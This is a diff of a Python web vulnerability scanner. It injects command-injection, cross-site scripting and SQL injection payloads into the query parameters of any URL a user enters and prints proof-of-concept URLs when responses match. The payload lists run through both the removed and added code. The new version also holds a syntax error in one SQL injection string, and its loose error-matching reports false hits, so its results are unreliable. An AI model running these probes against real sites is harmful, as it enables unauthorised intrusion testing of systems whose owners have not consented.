@@ -1,8 +1,8 @@
-import urllib.request
+#!/usr/bin/env python3
+import requests
 import re
-import os
 import time
-from urllib.error import HTTPError, URLError
+import os
 
 class Colors:
     def __init__(self):
@@ -12,113 +12,95 @@ class Colors:
         self.yellow = "\033[93m"
         self.red = "\033[91m"
         self.end = "\033[0m"
+ga = Colors()
 
-colors = Colors()
+class Scanner:
+    HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0"}
 
-def headers_reader(url):
-    print(colors.bold + "\n[!] Fingerprinting the backend Technologies." + colors.end)
-    try:
-        opener = urllib.request.urlopen(url)
-        if opener.getcode() == 200:
-            print(colors.green + "[!] Status code: 200 OK" + colors.end)
-        elif opener.getcode() == 404:
-            print(colors.red + "[!] Page was not found! Please check the URL\n" + colors.end)
-            return
+    def __init__(self, url):
+        self.url = url
 
-        server = opener.headers.get("Server", "Unknown")
-        host = urllib.parse.urlparse(url).hostname
-        print(colors.green + "[!] Host: " + str(host) + colors.end)
-        print(colors.green + "[!] WebServer: " + str(server) + colors.end)
-
-        for key, value in opener.headers.items():
-            if key.lower() == "x-powered-by":
-                print(colors.green + f"[!] {key}: {value}" + colors.end)
-
-    except (HTTPError, URLError) as e:
-        print(colors.red + f"[!] Error fetching headers: {e}" + colors.end)
-
-def main_function(url, payloads, check):
-    try:
-        urllib.request.urlopen(url)  # Test URL accessibility
-    except (HTTPError, URLError):
-        print(colors.red + "[!] Unable to open URL. Exiting." + colors.end)
-        return
-
-    vuln = 0
-    for params in urllib.parse.urlsplit(url).query.split("&"):
-        for payload in payloads:
-            bugs = url.replace(params, params + str(payload).strip())
-            try:
-                request = urllib.request.urlopen(bugs)
-                html = request.read().decode("utf-8")
-                if re.search(check, html, re.I):
-                    print(colors.red + "[*] Payload Found..." + colors.end)
-                    print(colors.red + f"[*] Payload: {payload}" + colors.end)
-                    print(colors.green + f"[!] Code Snippet: {html.strip()}" + colors.end)
-                    print(colors.blue + f"[*] POC: {bugs}" + colors.end)
-                    print(colors.green + "[*] Happy Exploitation :D" + colors.end)
-                    vuln += 1
-            except Exception as e:
-                print(colors.yellow + f"[!] Error during request: {e}" + colors.end)
-
-    if vuln == 0:
-        print(colors.green + "[!] Target is not vulnerable!" + colors.end)
-    else:
-        print(colors.blue + f"[!] Congratulations you've found {vuln} bugs :-)" + colors.end)
-
-def rce_func(url):
-    headers_reader(url)
-    print(colors.bold + "[!] Now Scanning for Remote Code/Command Execution" + colors.end)
-    print(colors.blue + "[!] Covering Linux & Windows Operating Systems" + colors.end)
-    print(colors.blue + "[!] Please wait...." + colors.end)
-    payloads = [';${@print(md5(dadevil))}', ';${@print(md5("dadevil"))}', '%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
-    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
-    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\\[boot", re.I)
-    main_function(url, payloads, check)
-
-def xss_func(url):
-    print(colors.bold + "\n[!] Now Scanning for XSS" + colors.end)
-    print(colors.blue + "[!] Please wait...." + colors.end)
-    payloads = ['%27%3Edadevil0%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', '%78%22%78%3e%78']
-    payloads += ['%22%3Edadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', 'dadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb']
-    check = re.compile('dadevil<svg|x>x', re.I)
-    main_function(url, payloads, check)
-
-def error_based_sqli_func(url):
-    print(colors.bold + "\n[!] Now Scanning for Error Based SQL Injection" + colors.end)
-    print(colors.blue + "[!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases" + colors.end)
-    print(colors.blue + "[!] Please wait...." + colors.end)
-    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
-    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+quote|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
-    main_function(url, payloads, check)
-
-def urls_or_list():
-    url_or_list = input(colors.green + "[!] Scan URL or List of URLs? [1/2]: " + colors.end)
-    if url_or_list == "1":
-        url = input("[!] Enter the URL: ")
-        if "?" in url:
-            rce_func(url)
-            xss_func(url)
-            error_based_sqli_func(url)
-        else:
-            print(colors.red + "\n[Warning] Invalid URL format." + colors.end)
-            print(colors.red + "[Warning] Ensure the URL contains parameters." + colors.end)
-    elif url_or_list == "2":
-        urls_list = input(colors.green + "[!] Enter the list file name (e.g., list.txt): " + colors.end)
+    def headers_reader(self):
+        print(ga.bold + "\n[!] Fingerprinting the backend Technologies." + ga.end)
         try:
-            with open(urls_list, "r") as file:
-                for line in file:
-                    url = line.strip()
-                    if "?" in url:
-                        print(colors.green + f"\n[!] Now Scanning {url}" + colors.end)
-                        rce_func(url)
-                        xss_func(url)
-                        error_based_sqli_func(url)
-                    else:
-                        print(colors.red + f"\n[Warning] Invalid URL format: {url}" + colors.end)
-        except FileNotFoundError:
-            print(colors.red + "[!] File not found. Please check the file name and try again." + colors.end)
-    else:
-        print(colors.red + "[!] Invalid option selected." + colors.end)
+            response = requests.get(self.url, headers=self.HEADERS, timeout=10)
+            response.raise_for_status()
+            print(ga.green + f"[!] Status Code: {response.status_code} OK" + ga.end)
 
-urls_or_list()
+            server = response.headers.get("Server", "Unknown")
+            powered_by = response.headers.get("X-Powered-By", "Unknown")
+            host = self.url.split("/")[2]
+
+            print(ga.green + f"[!] Host: {host}" + ga.end)
+            print(ga.green + f"[!] WebServer: {server}" + ga.end)
+            if powered_by != "Unknown":
+                print(ga.green + f"[!] Powered By: {powered_by}" + ga.end)
+        except requests.exceptions.RequestException as e:
+            print(ga.red + f"[!] Error: {e}" + ga.end)
+
+    def main_function(self, payloads, check):
+        vuln_count = 0
+        print(ga.bold + "\n[!] Scanning for vulnerabilities..." + ga.end)
+
+        for params in self.url.split("?")[1].split("&"):
+            for payload in payloads:
+                test_url = self.url.replace(params, params + payload)
+                try:
+                    response = requests.get(test_url, headers=self.HEADERS, timeout=10)
+                    response_text = response.text
+
+                    if re.search(check, response_text):
+                        print(ga.red + "[!] Vulnerability Found!" + ga.end)
+                        print(ga.red + f"[!] Payload: {payload}" + ga.end)
+                        print(ga.blue + f"[!] PoC URL: {test_url}" + ga.end)
+                        vuln_count += 1
+                except requests.exceptions.RequestException as e:
+                    print(ga.red + f"[!] Error with payload {payload}: {e}" + ga.end)
+
+        if vuln_count == 0:
+            print(ga.green + "[!] Target is not vulnerable!" + ga.end)
+        else:
+            print(ga.blue + f"[!] Found {vuln_count} vulnerabilities." + ga.end)
+
+    def rce_scan(self):
+        print(ga.bold + "\n[!] Scanning for Remote Code Execution (RCE)..." + ga.end)
+        payloads = [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();']
+        check = re.compile(r"Linux|eval\(|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
+        self.main_function(payloads, check)
+
+    def xss_scan(self):
+        print(ga.bold + "\n[!] Scanning for Cross-Site Scripting (XSS)..." + ga.end)
+        payloads = [
+            "<svg/onload=alert(1)>",
+            "'%3Csvg/onload=alert(1)%3E"
+        ]
+        check = re.compile(r"<svg|alert", re.I)
+        self.main_function(payloads, check)
+
+    def sqli_scan(self):
+        print(ga.bold + "\n[!] Scanning for SQL Injection..." + ga.end)
+        payloads = [
+            "' OR '1'='1", "3'%20OR%201=1", "3"><script>alert(1)</script>"
+        ]
+        check = re.compile(r"syntax|error|SQL|Fatal", re.I)
+        self.main_function(payloads, check)
+
+
+def main():
+    os.system("clear")
+    print(ga.green + """
+    Vulnerability Scanner v1.0
+    Created by NOVOHORY - NOVOSAD
+    Use responsibly. Unauthorized scanning is prohibited.
+    """ + ga.end)
+
+    url = input(ga.yellow + "Enter the target URL (e.g., http://example.com/page.php?id=1): " + ga.end)
+    scanner = Scanner(url)
+
+    scanner.headers_reader()
+    scanner.rce_scan()
+    scanner.xss_scan()
+    scanner.sqli_scan()
+
+if __name__ == "__main__":
+    main()
